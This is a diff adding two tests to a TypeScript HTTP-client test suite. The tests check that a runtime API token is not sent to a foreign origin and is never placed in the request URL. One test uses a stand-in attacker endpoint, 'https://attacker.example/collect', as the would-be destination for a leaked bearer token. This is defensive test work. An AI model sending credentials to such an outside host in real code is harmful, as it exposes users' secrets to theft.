@@ -102,6 +102,50 @@ describe("createRequest", () => {
     expect((init.headers as Record<string, string>).authorization).toBe("Bearer secret");
   });
 
+  it("does not send the runtime token to an absolute URL on another origin", async () => {
+    const calls: unknown[][] = [];
+    const request = createRequest({
+      baseUrl: "http://127.0.0.1:4321",
+      token: "runtime-secret",
+      fetch: mockFetchFn((...args) => {
+        calls.push(args);
+        return Promise.resolve(jsonResponse({}));
+      }),
+    });
+
+    await request("https://attacker.example/collect");
+
+    const [url, init] = calls[0] as [string, RequestInit];
+    expect(url).toBe("https://attacker.example/collect");
+    expect((init.headers as Record<string, string>).authorization).toBeUndefined();
+  });
+
+  it("uses the discovered CLI token without exposing it in the request URL", async () => {
+    const previous = process.env.PSTDIO_API_TOKEN;
+    const calls: unknown[][] = [];
+    process.env.PSTDIO_API_TOKEN = "runtime-secret";
+
+    try {
+      const request = createRequest({
+        baseUrl: "http://127.0.0.1:4321",
+        fetch: mockFetchFn((...args) => {
+          calls.push(args);
+          return Promise.resolve(jsonResponse({}));
+        }),
+      });
+
+      await request("/v1/projects");
+
+      const [url, init] = calls[0] as [string, RequestInit];
+      expect(url).toBe("http://127.0.0.1:4321/v1/projects");
+      expect((init.headers as Record<string, string>).authorization).toBe("Bearer runtime-secret");
+      expect(init.credentials).toBe("same-origin");
+    } finally {
+      if (previous === undefined) delete process.env.PSTDIO_API_TOKEN;
+      else process.env.PSTDIO_API_TOKEN = previous;
+    }
+  });
+
   it("throws PstdioApiError with message from error body", async () => {
     const request = createRequest({
       baseUrl: "http://test:1234",
